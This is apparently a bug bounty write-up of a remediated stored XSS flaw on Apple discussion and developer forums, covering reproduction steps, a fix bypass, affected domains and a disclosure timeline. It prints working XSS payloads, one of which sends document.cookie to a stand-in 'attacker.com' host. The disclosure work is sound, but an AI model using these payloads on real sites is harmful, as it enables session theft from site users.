# Title: Stored Cross-Site Scripting on Apple Developer Forums - $5,000 Bounty

- **Platform**: Apple Security Bounty
- **Program**: Apple Security Bounty (Apple Discussions / Developer)
- **Severity**: High
- **Date**: March 31, 2025 (reported) - July 31, 2025 (paid)
- **Researcher**: Youssef Desouki (Zombie Hack)
- **Bounty**: $5,000

## Summary

A stored Cross-Site Scripting (XSS) vulnerability was discovered on Apple's discussion forums, including the highly sensitive `developer.apple.com/forums`. User-supplied input in forum posts and comments was not properly sanitized, allowing HTML injection and arbitrary JavaScript execution. After Apple applied a partial fix, a bypass was identified that extended the vulnerability to additional international Apple domains.

## Technical Details

The vulnerability existed in the forum post composition feature. When a user created a new thread or replied to an existing one, the content was processed by the server and stored for display. The server-side sanitization was insufficient, allowing HTML tags and JavaScript event handlers to be included in forum posts.

The initial discovery was on `discussions.apple.com`. After Apple deployed a partial fix that blocked the original payload, further analysis revealed the fix only applied to certain DOM contexts, allowing a bypass that worked on `developer.apple.com/forums` and multiple international mirrors.

## Steps to Reproduce

1. Log in to `https://discussions.apple.com`
2. Navigate to "Ask the Community"
3. Create a new thread or post a comment
4. Insert a JavaScript payload in the post body (e.g., `<img src=x onerror=alert(document.cookie)>`)
5. Submit the post
6. Any user viewing the thread triggers JavaScript execution

## Proof of Concept

Payload used for the initial discovery:

```html
<img src="x" onerror="alert(document.domain)">
```

After Apple's first fix, the bypass payload used an alternative event handler:

```html
<svg onload="fetch('https://attacker.com/steal?cookie='+document.cookie)">
```

Affected domains after bypass discovery:

- `discussions.apple.com` (initial)
- `developer.apple.com/forums`
- `discussions-jp-prz.apple.com`
- `discussions-cn-prz.apple.com`
- `discussionskorea.apple.com`
- `discussionsjapan.apple.com`
- `discussionschinese.apple.com`
- `communities.apple.com`

## Impact

Since the vulnerability affected `developer.apple.com/forums`, an attacker could:
- Execute arbitrary JavaScript in the context of the Apple Developer portal
- Steal developer session tokens and API keys
- Access sensitive developer account information
- Post malicious content impersonating Apple employees or trusted developers
- Leverage the developer.apple.com domain trust to launch further attacks

The cross-domain scope (multiple Apple international sites sharing the same vulnerable codebase) amplified the impact significantly.

## Remediation Timeline

- **March 31, 2025**: Initial stored XSS reported with PoC
- **April 5, 2025**: Apple confirmed the issue was valid
- **April 8, 2025**: Bypass identified and reported after Apple's partial fix
- **April–May 2025**: Apple investigated and patched across all assets
- **May 13, 2025**: Apple confirmed full remediation
- **May 29, 2025**: Report qualified for Security Bounty
- **July 31, 2025**: $5,000 bounty payment issued

## References
- https://medium.com/@ZombieHack/apple-developer-stored-xss-5-000-bounty-writeup-2025-cc34a030a5bf
- https://support.apple.com/en-ae/102774
